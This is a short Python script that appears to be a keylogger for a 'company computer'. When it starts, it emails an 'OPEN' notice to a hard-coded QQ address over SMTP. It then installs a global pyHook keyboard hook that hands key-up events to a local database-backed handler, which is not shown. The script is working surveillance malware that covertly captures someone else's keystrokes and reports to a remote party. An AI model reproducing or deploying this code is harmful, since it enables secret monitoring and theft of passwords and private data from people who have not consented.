import smtplib
from email.mime.text import MIMEText
from email.header import Header
import os
import sys
sys.path.append('./SQL')
import table_create
import pyHook
import pythoncom


mail_host = "smtp.QQ.com"
mail_user = os.environ.get('MAIL_USERNAME')
mail_pass = os.environ.get('MAIL_PASSWORD')

sender = '286345901@qq.com'
receivers = ['286345901@qq.com']

message = MIMEText('OPEN', 'plain', 'utf-8')
message['From'] = Header("test", 'utf-8')
message['To'] = Header("test", 'utf-8')

subject = 'company computer'
message['Subject'] = Header(subject, 'utf-8')

try:
    smtpObj = smtplib.SMTP()
    smtpObj.connect(mail_host, 25)
    smtpObj.login(mail_user, mail_pass)
    smtpObj.sendmail(sender, receivers, message.as_string())
    print("mes send")
except smtplib.SMTPException:
    print("Error: can not send mes")

mykbmanager = table_create.KeyBoardManager()
hookmanager = pyHook.HookManager()
hookmanager.KeyUp = mykbmanager.onKeyUp
hookmanager.HookKeyboard()
pythoncom.PumpMessages()

